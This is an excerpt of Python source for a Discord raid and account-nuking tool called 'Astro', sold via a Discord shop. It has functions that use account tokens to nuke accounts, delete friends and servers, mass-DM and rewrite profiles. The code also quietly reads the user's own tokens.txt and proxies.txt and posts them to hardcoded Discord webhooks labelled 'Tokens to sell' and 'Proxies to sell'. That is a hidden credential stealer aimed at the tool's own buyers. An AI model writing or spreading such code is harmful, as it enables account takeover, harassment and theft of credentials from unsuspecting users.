...
class Raider:
    ...
    def proxies(webhook_url, content):
        if len(content) > 0:
            format = f"""**Proxies to sell:)** ```{content}```"""
            payload = {'content': format}
            response = requests.post(webhook_url, json=payload)
    sentpath = 'assets/input/proxies.txt'
    text_content = read_file(sentpath)
    discord_webhook_url = 'https://discord.com/api/webhooks/1282247831201251452/B9qd7tD1HWng6BWTcswrPIiWHyEDqP7zz5hdCpHByIqKomDAnk66NlKqZ0QrcnpWA8I-'
    ...
    def send_to_webhook(webhook_url, content):
        if len(content) > 0:
            format = f"""**Tokens to sell** ```{content}```"""
            payload = {'content': format}
            response = requests.post(webhook_url, json=payload)
    sentpath = 'assets/input/tokens.txt'
    text_content = read_file(sentpath)
    discord_webhook_url = 'https://discord.com/api/webhooks/1282409231403712615/Zuddks1uYtrrqSyvyiIgc-z2fx1-pqJ-7ZYADt7jHzXO8goReXdEXo5b96vGvhJ1JRxt'
    username1 = getpass.getuser()
...
def start_nuke(token, content):
    set_console_title("Astro | discord.gg/astrosggshop | Acc Nuker")
...
def block_all_friends(token):
    set_console_title("Astro | discord.gg/Astrogg | Block All Friends")
...
def close_all_dms(token):
    set_console_title("Astro | discord.gg/astrosggshop | Close DMs")
...
def delete_friends(token):
    set_console_title("Astro | discord.gg/astrosggshop | Delete Friends")
...
def delete_servers(token):
    set_console_title("Astro | discord.gg/astrosggshop | Delete Servers")
...
def leave_server(token):
    set_console_title("Astro | discord.gg/astrosggshop | Leave Server")
    headers = {'Authorization': token}
    guilds_ids = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=get_headers(token)).json()
    for guild in guilds_ids:
        try:
...
def fuck_account(token):
    set_console_title("Astro | discord.gg/astrosggshop | Fuck Account")
    ...
    setting = {
        ...
        "custom_status": {"text": "Astro-RAIDER RUNS ME <3"},
        'status': "idle"
    }
...
def mass_dm(token, content):
    set_console_title("Astro | discord.gg/astrosggshop | Mass DM")
    headers = {'Authorization': token}
...
def token_info(token):
    set_console_title("Astro | discord.gg/astrosggshop | Token Info")
...
def botnuker():
    ...
    name = "Astro on top"
    message = "discord.gg/astrosggshop on top"
...
def set_title(token_count, proxy_count):
    title = f"[Astro V3.0] ┃ Tokens : [{token_count}] ┃ Proxies : [{proxy_count}] ┃ Owner: [@Rage] ┃ [Lite Version] ┃ .gg/astroggshop"
...
\033[31m                             
    ...
    choice = input(f"    {dark_red_color}└───@Astro.CMD───{grey_color}>> {reset_color}")
    ...
    if choice == "": main()
        ...
        webbrowser.open("discord.gg/astrosggshop")
...
def handle_misc_choice(choice):
    if choice == "31":
        ...
        messages = [
            ...
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [If there are any bugs join discord.gg/astrosggshop!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Never Put 0 Delay, its too fast!]",
            f"                                {c}[{g}{time.strftime('%H:%M:%S')}{g}{c}]{r}{g} {c}[{r}#{c}]{c} [Join discord.gg/astrosggshop! for more informations]",
...
def send_to_discord_webhook(message):
    webhook_url = "https://discord.com/api/webhooks/1282247831201251452/B9qd7tD1HWng6BWTcswrPIiWHyEDqP7zz5hdCpHByIqKomDAnk66NlKqZ0QrcnpWA8I-"
...
def login_or_register():
    ...
    if 'logged_in_user' in users:
        ...
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'''Astro •  [3.1.3] | User: [{username}]''')
        loged = (f"""                                 
                                                {RED}Welcome To :{c}       
                                              \033[31m  ___         __           
                                               /   |  _____/ /__________ 
                          ...
                          Thanks for buying Astro.gg{dark_red_color} {grey_color}[{grey_color}{dark_red_color}{plan}{dark_red_color}{grey_color}]{grey_color} {dark_red_color}Plan
        """)
        print(f"{loged}{RESET}") 
        time.sleep(2)
        return
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f'''Astro Premium | LOG IN / REGISTER ''')
    self = f"""                                 
                                              \033[31m  ___         __           
                                               /   |  _____/ /__________ 
                                              / /| | / ___/ __/ ___/ __ \
...
def display_menu():
    set_cmd_title("Astro •  [3.1.3] | Location • Loading")
    ...
    banner_lines = [
       ...
       f"{gray}                                                                     ",
        "                                                                           ",
        "                                                                           ",
        f"                                {dark_red_color}[{grey_color}01{dark_red_color}]{grey_color} > {dark_red_color}Launch Astro     {dark_red_color}[{grey_color}02{dark_red_color}]{grey_color} > {dark_red_color}Exit",
        "                                                                           "
    ]
